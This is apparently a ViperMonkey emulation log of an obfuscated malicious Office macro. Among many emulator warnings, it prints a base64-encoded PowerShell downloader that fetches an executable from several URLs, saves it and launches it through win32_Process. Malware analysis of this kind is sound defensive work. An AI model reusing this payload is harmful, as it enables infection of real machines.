+INFO     calling Function: CreateObject('winmgmt\x00:win32_Process\x00tartuP')
+INFO     ACTION: CreateObject - params ['winmgmt:win32_ProcesstartuP'] - Interesting Function Call
+WARNING  Variable 'hajFD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'FfISH' not found
+WARNING  Variable 'xXRsH' not found
+WARNING  Variable 'FfISH' not found
+WARNING  Variable 'ETjDHdrC' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'FGZHC' not found
+WARNING  Variable 'FfISH' not found
+WARNING  Variable 'IunEHTI' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'xPrqiIqAI' not found
+WARNING  Variable 'OrgVoJVG' not found
+WARNING  Variable 'xPrqiIqAI' not found
+WARNING  Variable 'IcgfIIeiH' not found
+INFO     calling Function: Int([2], {})
+WARNING  Variable 'WlMap' not found
+WARNING  Variable 'xPrqiIqAI' not found
+WARNING  Variable 'bvmIgh' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'NWvSBIw' not found
+WARNING  Variable 'DOElhuL' not found
+WARNING  Variable 'NWvSBIw' not found
+WARNING  Variable 'ygLPHDwCH' not found
+INFO     calling Function: Int([7], {})
+WARNING  Variable 'JLdVbtJJ' not found
+WARNING  Variable 'NWvSBIw' not found
+WARNING  Variable 'LjSzX' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'gTTMeyA' not found
+WARNING  Variable 'Ldwek' not found
+WARNING  Variable 'gTTMeyA' not found
+WARNING  Variable 'aBrEB' not found
+INFO     calling Function: Int([9], {})
+WARNING  Variable 'XtSxADDDH' not found
+WARNING  Variable 'gTTMeyA' not found
+WARNING  context.set() Mzj4a1lpxlocl6w.showwindow is improper type. <class 'vipermonkey.core.expressions.MemberAccessExpression'>
+WARNING  Variable 'EumFBCI' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'nhWAHnFB' not found
+WARNING  Variable 'RuqVjGDFJ' not found
+WARNING  Variable 'nhWAHnFB' not found
+WARNING  Variable 'HLmwcnBu' not found
+INFO     calling Function: Int([76], {})
+WARNING  Variable 'cXDRJfBFC' not found
+WARNING  Variable 'nhWAHnFB' not found
+WARNING  Variable 'iXKPBJFBA' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'mlcVVA' not found
+WARNING  Variable 'ixMjIBX' not found
+WARNING  Variable 'mlcVVA' not found
+WARNING  Variable 'lGtiFps' not found
+INFO     calling Function: Int([6], {})
+WARNING  Variable 'WAhEIJG' not found
+WARNING  Variable 'mlcVVA' not found
+WARNING  Variable 'BPKmBBGi' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'kUFdE' not found
+WARNING  Variable 'UUuhJDGf' not found
+WARNING  Variable 'kUFdE' not found
+WARNING  Variable 'cvxWzEG' not found
+INFO     calling Function: Int([60], {})
+WARNING  Variable 'jMaCFE' not found
+WARNING  Variable 'kUFdE' not found
+WARNING  Variable 'uHcuEiFq' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'zXeKBEa' not found
+WARNING  Variable 'NnpvACDA' not found
+WARNING  Variable 'zXeKBEa' not found
+WARNING  Variable 'ASiEPg' not found
+INFO     calling Function: Int([7978], {})
+WARNING  Variable 'kPgnBETR' not found
+WARNING  Variable 'zXeKBEa' not found
+WARNING  Variable 'zcElKLMzb' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'DsedwEP' not found
+WARNING  Variable 'zOBCEIFQF' not found
+WARNING  Variable 'DsedwEP' not found
+WARNING  Variable 'lkYEB' not found
+INFO     calling Function: Int([774], {})
+WARNING  Variable 'iSJwHD' not found
+WARNING  Variable 'DsedwEP' not found
+WARNING  Variable 'UOZUBEJ' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'KASXgeQRI' not found
+WARNING  Variable 'IxnZJ' not found
+WARNING  Variable 'KASXgeQRI' not found
+WARNING  Variable 'SSkmNJF' not found
+INFO     calling Function: Int([327], {})
+WARNING  Variable 'SSCRAC' not found
+WARNING  Variable 'KASXgeQRI' not found
+WARNING  Variable 'CqgyKs' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TBoXFEGIJ' not found
+WARNING  Variable 'lGxeDDz' not found
+WARNING  Variable 'TBoXFEGIJ' not found
+WARNING  Variable 'WeMdaI' not found
+INFO     calling Function: Int([9], {})
+WARNING  Variable 'oUhMI' not found
+WARNING  Variable 'TBoXFEGIJ' not found
+WARNING  Variable 'fKfxY' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'xLHuHkI' not found
+WARNING  Variable 'OeTLCTUHD' not found
+WARNING  Variable 'xLHuHkI' not found
+WARNING  Variable 'UdGNBH' not found
+INFO     calling Function: Int([609], {})
+WARNING  Variable 'GxALIIp' not found
+WARNING  Variable 'xLHuHkI' not found
+INFO     calling Function: Hs6la7eq2yreh('0 huBJ [] []wpo][ (0 huBJ [] []wwe][ (0 huBJ [] []wrs][ (0 huBJ [] []whe][ (0 h...)
+WARNING  Variable 'FKRsCaZJ' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'ccnEYCJJ' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'FXRUDFzI' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'ikvPTbHJD' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'lVPeCLH' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'BnXwVCADJ' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'gCCBA' not found
+INFO     calling Function: Int([10], {})
+WARNING  Variable 'OpGmJkD' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'onazcGHG' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'yaPEJZm' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'vrMQuI' not found
+INFO     calling Function: Int([8], {})
+WARNING  Variable 'iFUDE' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'ypjbIafu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'HLIXTr' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'hYeFCmJn' not found
+INFO     calling Function: Int([3027], {})
+WARNING  Variable 'ldGLJb' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'B5kxad2f6a9l2wec' not found
+INFO     calling Function: Nlpfpcsbssrm8y('0 huBJ [] []wpo][ (0 huBJ [] []wwe][ (0 huBJ [] []wrs][ (0 huBJ [] []whe][ (0 h...)
+WARNING  Variable 'tesVJjZBm' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'UUDADE' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'jZGaAv' not found
+INFO     calling Function: Int([3], {})
+WARNING  Variable 'AANxPGAC' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'ZPZoX' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'NiKKI' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'OghWI' not found
+INFO     calling Function: Int([96], {})
+WARNING  Variable 'mICRC' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'Y0buszs_jp_hoe' not found
+INFO     calling Function: Replace('0 huBJ [] []wpo][ (0 huBJ [] []wwe][ (0 huBJ [] []wrs][ (0 huBJ [] []whe][ (0 h...)
+INFO     Found possible intermediate IOC (base64): 'cwBFAHQALQBJAHQARQBNACAAdgBhAHIASQBBAEIATABlADoATgA1ADkATwBtACAAIAAoACAAWwB0AFkAcABFAF0AKAAiAHsAMQB9AHsANAB9AHsAMAB9AHsAMgB9AHsAMwB9AHsANQB9ACIALQBGACAAJwBtAC4ASQAnACwAJwBTAHkAJwAsACcAbwAuAGQAaQAnACwAJwByAGUAYwB0AG8AUgAnACwAJwBTAFQAZQAnACwAJwBZACcAKQApACAAOwBzAEUAVAAgACgAJwB4ADIAJwArACcAaQAnACkAIAAoAFsAdABZAHAARQBdACgAIgB7ADUAfQB7ADQAfQB7ADMAfQB7ADEAfQB7ADIAfQB7ADAAfQB7ADYAfQAiACAALQBmACAAJwBBACcALAAnAEkAYwBFAHAATwBJACcALAAnAG4AdABNACcALAAnAFYAJwAsACcAcgAnACwAJwBTAFkAcwB0AGUATQAuAG4ARQBUAC4AcwBFACcALAAnAG4AQQBHAGUAUgAnACkAIAApACAAOwAkAFIAdQBzAHYAYwB4AHYAPQAoACcAVQBsACcAKwAoACcAMQAnACsAJwBwADIAcAAwACcAKQApADsAJABLADAAdQBsAHAAbgBlAD0AJABUADAAMAAzADgAcgBnACAAKwAgAFsAYwBoAGEAcgBdACgANgA0ACkAIAArACAAJABFADkANgBtAGsAZgA4ADsAJABaAHcAeAA2ADYAdAAwAD0AKAAoACcASQA5AGYAJwArACcAdgAnACkAKwAoACcAeAAnACsAJwAwAGgAJwApACkAOwAoACAAIABnAEUAdAAtAFYAQQBSAEkAYQBiAGwARQAgACAATgA1ADkATwBNACAALQB2AGEAbAB1AGUATwBuAGwAeQApADoAOgAiAEMAYABSAGUAQQBUAGAARQBEAEkAcgBlAGAAYwBgAFQAbwBSAHkAIgAoACQASABPAE0ARQAgACsAIAAoACgAKAAnAG0AJwArACcAdAB6AEQAOAAnACsAJwBjADkAOABuACcAKQArACcAbgAnACsAKAAnAG0AdAB6AE8AcwAnACsAJwBzACcAKQArACcAMAAnACsAKAAnADgAYgBfACcAKwAnAG0AdAB6ACcAKQApAC0AcgBlAFAATABBAEMARQAgACAAKABbAEMASABhAFIAXQAxADAAOQArAFsAQwBIAGEAUgBdADEAMQA2ACsAWwBDAEgAYQBSAF0AMQAyADIAKQAsAFsAQwBIAGEAUgBdADkAMgApACkAOwAkAE8AZwBoADkAZABpAGMAPQAoACcASgBoACcAKwAoACcAcABmADMAJwArACcAaQAnACkAKwAnADYAJwApADsAKAAgAFYAQQByAGkAQQBiAEwARQAgACAAKAAnAFgAMgAnACsAJwBpACcAKQAgAC0AVgBhAGwAVQBlACkAOgA6ACIAcwBgAGUAQwBgAFUAUgBpAHQAeQBgAHAAUgBPAFQATwBDAE8AbAAiACAAPQAgACgAKAAnAFQAJwArACcAbABzACcAKQArACcAMQAyACcAKQA7ACQASwBtAHEAZQA0AGQAcgA9ACgAJwBaAHEAJwArACgAJwBxACcAKwAnADAAbQB2ACcAKQArACcAeQAnACkAOwAkAFIANwBfAGMAeQAwAHAAIAA9ACAAKAAnAFQAJwArACgAJwAxADQAJwArACcAZQAnACkAKwAnADAAMAAnACkAOwAkAFQAdQBwAHIAeABlADUAPQAoACgAJwBCACcAKwAnAGMAcgAnACkAKwAoACcAZwAnACsAJwBrAHMAYwAnACkAKQA7ACQATAB6ADAAMAB4ADQAZAA9ACgAJwBVACcAKwAoACcAdQBnAHAAJwArACcAYgBxADIAJwApACkAOwAkAFkANwBlAGQAbgBsADIAPQAkAEgATwBNAEUAKwAoACgAJwB7ADAAfQBEACcAKwAoACcAOAAnACsAJwBjADkAJwApACsAJwA4AG4AbgB7ACcAKwAnADAAfQBPAHMAJwArACcAcwAwADgAYgBfAHsAJwArACcAMAB9ACcAKQAtAEYAIABbAEMASABBAFIAXQA5ADIAKQArACQAUgA3AF8AYwB5ADAAcAArACgAKAAnAC4AJwArACcAZQB4ACcAKQArACcAZQAnACkAOwAkAEwAYwB6AHYAbgB4ADUAPQAoACcARQAxACcAKwAnAG4AOAAnACsAKAAnADYAJwArACcAcABuACcAKQApADsAJABaAGcAbABhADUAYQByAD0ALgAoACcAbgBlAHcALQBvAGIAagAnACsAJwBlAGMAJwArACcAdAAnACkAIABuAGUAVAAuAFcAZQBCAGMATABJAGUATgBUADsAJABHAGwANgBnADUANwBlAD0AJwBdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AaAB0AHQATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AcABzADoATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALwAvAGcATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AaQB0AGgATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AdQBiAC4ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AYwBvAG0ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALwBqAG8ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZQB6AGkATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZAAvAGoATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AbwBlAHoATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AaQBkAC4ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZwBpAHQATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AaAB1AGIATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALgBpAG8ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALwByAGEATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AdwAvAG0ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AYQBpAG4ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0ALwBJAG0ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AYQBnAGUATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AcwAvAFcATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZQBpAHIATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AZABvAC4ATQBCADIAeABdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AcABuAGcATQBCADIAeAAnAC4AIgBSAGUAcABMAEEAYABjAEUAIgAoACgAJwBdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0AJwApACwAJwAnACkALgAiAFIAZQBwAEwAQQBgAGMARQAiACgAKAAnAE0AQgAyAHgAJwApACwAJwAnACkAOwAkAEkAMwAxAGgANABzAF8APQAoACgAJwBXADYAJwArACcANAA5ACcAKQArACcAcABnACcAKwAnAGIAJwApADsAZgBvAHIAZQBhAGMAaAAgACgAJABYAGQAeABmAGQAMABiACAAaQBuACAAJABHAGwANgBnADUANwBlACkAewB0AHIAeQB7ACQAWgBnAGwAYQA1AGEAcgAuACIAZABPAFcATgBMAGAATwBhAEQARgBJAGAATABlACIAKAAkAFgAZAB4AGYAZAAwAGIALAAgACQAWQA3AGUAZABuAGwAMgApADsAJABGAHIAMgB5AGQAbAAyAD0AKAAoACcATAAzAGQAJwArACcANgA5ADIAJwApACsAJwBnACcAKQA7AEkAZgAgACgAKAAmACgAJwBHAGUAJwArACcAdAAtAEkAdAAnACsAJwBlAG0AJwApACAAJABZADcAZQBkAG4AbAAyACkALgAiAEwAYABlAG4AZwBgAFQASAAiACAALQBnAGUAIAAxADIAMgA4ADgAMAApACAAewAoAFsAdwBtAGkAYwBsAGEAcwBzAF0AKAAnAHcAJwArACcAaQBuACcAKwAnADMAJwArACgAJwAyACcAKwAnAF8AUAByAG8AJwApACsAKAAnAGMAZQBzACcAKwAnAHMAJwApACkAKQAuACIAQwBSAGAARQBBAFQAZQAiACgAJABZADcAZQBkAG4AbAAyACkAOwAkAFQAdgBkAHoAZgA4AGcAPQAoACgAJwBPAHUAJwArACcAZQAnACkAKwAnAGgAegAnACsAJwB0AGsAJwApADsAYgByAGUAYQBrADsAJABJADcAcgB5AGEAdQBhAD0AKAAnAEcAJwArACgAJwAyAGIAJwArACcAbwBlADcAJwApACsAJwBlACcAKQB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAQgA3AHoAdwAwAHkAYgA9ACgAKAAnAE8AJwArACcAawB0ADMAJwApACsAJwB3ACcAKwAnAGoAMgAnACkA'
+WARNING  Variable 'EHvkO' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'VQalCkIB' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'vHMbJ' not found
+INFO     calling Function: Int([9534], {})
+WARNING  Variable 'gjFABo' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'blnYADd' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'AuAejI' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'PTlyI' not found
+INFO     calling Function: Int([7], {})
+WARNING  Variable 'ZvHnJnEK' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'HOUwnBu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'TlUjhLLJA' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'WJvBCKHID' not found
+INFO     calling Function: Int([6], {})
+WARNING  Variable 'dUUaCoAF' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'KpBuSD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'CbNRHyiAC' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'KUjbsE' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'hrBsJDH' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'rKkPEN' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'GLdxBp' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'FZxFN' not found
+INFO     calling Function: Int([543], {})
+WARNING  Variable 'DhVOC' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'LpewHGFAD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'bFSOZEHfH' not found
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'EDWgzFhEr' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'xIFYIJfEA' not found
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'A9zw1op79tt8s5' not found
+INFO     calling Function: Hs6la7eq2yreh('0 huBJ [] []wpo][ (0 huBJ [] []wwe][ (0 huBJ [] []wrs][ (0 huBJ [] []whe][ (0 h...)
+WARNING  Variable 'FKRsCaZJ' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'ccnEYCJJ' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'FXRUDFzI' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'ikvPTbHJD' not found
+WARNING  Variable 'RobwD' not found
+WARNING  Variable 'lVPeCLH' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'BnXwVCADJ' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'gCCBA' not found
+INFO     calling Function: Int([10], {})
+WARNING  Variable 'OpGmJkD' not found
+WARNING  Variable 'kMivbHM' not found
+WARNING  Variable 'onazcGHG' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'yaPEJZm' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'vrMQuI' not found
+INFO     calling Function: Int([8], {})
+WARNING  Variable 'iFUDE' not found
+WARNING  Variable 'UviiCJt' not found
+WARNING  Variable 'ypjbIafu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'HLIXTr' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'hYeFCmJn' not found
+INFO     calling Function: Int([3027], {})
+WARNING  Variable 'ldGLJb' not found
+WARNING  Variable 'zZMDFSAqb' not found
+WARNING  Variable 'B5kxad2f6a9l2wec' not found
+INFO     calling Function: Nlpfpcsbssrm8y('0 huBJ [] []wpo][ (0 huBJ [] []wwe][ (0 huBJ [] []wrs][ (0 huBJ [] []whe][ (0 h...)
+WARNING  Variable 'tesVJjZBm' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'UUDADE' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'jZGaAv' not found
+INFO     calling Function: Int([3], {})
+WARNING  Variable 'AANxPGAC' not found
+WARNING  Variable 'fxhVJDiGu' not found
+WARNING  Variable 'ZPZoX' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'NiKKI' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'OghWI' not found
+INFO     calling Function: Int([96], {})
+WARNING  Variable 'mICRC' not found
+WARNING  Variable 'uWoAZE' not found
+WARNING  Variable 'Y0buszs_jp_hoe' not found
+INFO     calling Function: Replace('0 huBJ [] []wpo][ (0 huBJ [] []wwe][ (0 huBJ [] []wrs][ (0 huBJ [] []whe][ (0 h...)
+WARNING  Variable 'EHvkO' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'VQalCkIB' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'vHMbJ' not found
+INFO     calling Function: Int([9534], {})
+WARNING  Variable 'gjFABo' not found
+WARNING  Variable 'JlrdGDHBJ' not found
+WARNING  Variable 'blnYADd' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'AuAejI' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'PTlyI' not found
+INFO     calling Function: Int([7], {})
+WARNING  Variable 'ZvHnJnEK' not found
+WARNING  Variable 'nEkUIRGFD' not found
+WARNING  Variable 'HOUwnBu' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'TlUjhLLJA' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'WJvBCKHID' not found
+INFO     calling Function: Int([6], {})
+WARNING  Variable 'dUUaCoAF' not found
+WARNING  Variable 'QoThGd' not found
+WARNING  Variable 'KpBuSD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'CbNRHyiAC' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'KUjbsE' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'hrBsJDH' not found
+WARNING  Variable 'TvJbksC' not found
+WARNING  Variable 'rKkPEN' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'GLdxBp' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'FZxFN' not found
+INFO     calling Function: Int([543], {})
+WARNING  Variable 'DhVOC' not found
+WARNING  Variable 'ufQvJSj' not found
+WARNING  Variable 'LpewHGFAD' not found
+INFO     calling Function: Pyp8y812nivd8y3zx('NULL')
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'bFSOZEHfH' not found
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'EDWgzFhEr' not found
+INFO     calling Function: Int([1], {})
+WARNING  Variable 'xIFYIJfEA' not found
+WARNING  Variable 'TnpeIEI' not found
+WARNING  Variable 'A9zw1op79tt8s5' not found
+INFO     calling Function: Create('0 huBJ [] []wpowershell.exe -ENCOD cwBFAHQALQBJAHQARQBNACAAdgBhAHIASQBBAEIATABl...)
+INFO     ACTION: Create - params ['0 huBJ [] []wpowershell.exe -ENCOD cwBFAHQALQBJAHQARQBNACAAdgBhAHIASQBBAEIATABlADoATgA1ADkATwBtACAAIAAoACAAWwB0AFkAcABFAF0AKAAiAHsAMQB9AHsANAB9AHsAMAB9AHsAMgB9AHsAMwB9AHsANQB9ACIALQBGACAAJwBtAC4ASQAnACwAJwBTAHkAJwAsACcAbwAuAGQAaQAnACwAJwByAGUAYwB0AG8AUgAnACwAJwBTAFQAZQAnACwAJwBZACcAKQApACAAOwBzAEUAVAAgACgAJwB4ADIAJwArACcAaQAnACkAIAAoAFsAdABZAHAARQBdACgAIgB7ADUAfQB7ADQAfQB7ADMAfQB7ADEAfQB7ADIAfQB7ADAAfQB7ADYAfQAiACAALQBmACAAJwBBACcALAAnAEkAYwBFAHAATwBJACcALAAnAG4AdABNACcALAAnAFYAJwAsACcAcgAnACwAJwBTAFkAcwB0AGUATQAuAG4ARQBUAC4AcwBFACcALAAnAG4AQQBHAGUAUgAnACkAIAApACAAOwAkAFIAdQBzAHYAYwB4AHYAPQAoACcAVQBsACcAKwAoACcAMQAnACsAJwBwADIAcAAwACcAKQApADsAJABLADAAdQBsAHAAbgBlAD0AJABUADAAMAAzADgAcgBnACAAKwAgAFsAYwBoAGEAcgBdACgANgA0ACkAIAArACAAJABFADkANgBtAGsAZgA4ADsAJABaAHcAeAA2ADYAdAAwAD0AKAAoACcASQA5AGYAJwArACcAdgAnACkAKwAoACcAeAAnACsAJwAwAGgAJwApACkAOwAoACAAIABnAEUAdAAtAFYAQQBSAEkAYQBiAGwARQAgACAATgA1ADkATwBNACAALQB2AGEAbAB1AGUATwBuAGwAeQApADoAOgAiAEMAYABSAGUAQQBUAGAARQBEAEkAcgBlAGAAYwBgAFQAbwBSAHkAIgAoACQASABPAE0ARQAgACsAIAAoACgAKAAnAG0AJwArACcAdAB6AEQAOAAnACsAJwBjADkAOABuACcAKQArACcAbgAnACsAKAAnAG0AdAB6AE8AcwAnACsAJwBzACcAKQArACcAMAAnACsAKAAnADgAYgBfACcAKwAnAG0AdAB6ACcAKQApAC0AcgBlAFAATABBAEMARQAgACAAKABbAEMASABhAFIAXQAxADAAOQArAFsAQwBIAGEAUgBdADEAMQA2ACsAWwBDAEgAYQBSAF0AMQAyADIAKQAsAFsAQwBIAGEAUgBdADkAMgApACkAOwAkAE8AZwBoADkAZABpAGMAPQAoACcASgBoACcAKwAoACcAcABmADMAJwArACcAaQAnACkAKwAnADYAJwApADsAKAAgAFYAQQByAGkAQQBiAEwARQAgACAAKAAnAFgAMgAnACsAJwBpACcAKQAgAC0AVgBhAGwAVQBlACkAOgA6ACIAcwBgAGUAQwBgAFUAUgBpAHQAeQBgAHAAUgBPAFQATwBDAE8AbAAiACAAPQAgACgAKAAnAFQAJwArACcAbABzACcAKQArACcAMQAyACcAKQA7ACQASwBtAHEAZQA0AGQAcgA9ACgAJwBaAHEAJwArACgAJwBxACcAKwAnADAAbQB2ACcAKQArACcAeQAnACkAOwAkAFIANwBfAGMAeQAwAHAAIAA9ACAAKAAnAFQAJwArACgAJwAxADQAJwArACcAZQAnACkAKwAnADAAMAAnACkAOwAkAFQAdQBwAHIAeABlADUAPQAoACgAJwBCACcAKwAnAGMAcgAnACkAKwAoACcAZwAnACsAJwBrAHMAYwAnACkAKQA7ACQATAB6ADAAMAB4ADQAZAA9ACgAJwBVACcAKwAoACcAdQBnAHAAJwArACcAYgBxADIAJwApACkAOwAkAFkANwBlAGQAbgBsADIAPQAkAEgATwBNAEUAKwAoACgAJwB7ADAAfQBEACcAKwAoACcAOAAnACsAJwBjADkAJwApACsAJwA4AG4AbgB7ACcAKwAnADAAfQBPAHMAJwArACcAcwAwADgAYgBfAHsAJwArACcAMAB9ACcAKQAtAEYAIABbAEMASABBAFIAXQA5ADIAKQArACQAUgA3AF8AYwB5ADAAcAArACgAKAAnAC4AJwArACcAZQB4ACcAKQArACcAZQAnACkAOwAkAEwAYwB6AHYAbgB4ADUAPQAoACcARQAxACcAKwAnAG4AOAAnACsAKAAnADYAJwArACcAcABuACcAKQApADsAJABaAGcAbABhADUAYQByAD0ALgAoACcAbgBlAHcALQBvAGIAagAnACsAJwBlAGMAJwArACcAdAAnACkAIABuAGUAVAAuAFcAZQBCAGMATABJAGUATgBUADsAJABHAGwANgBnADUANwBlAD0AJwBdAFsAIAAoADAAIABoAHUAQgBKACAAWwBdACAAWwBdAE0A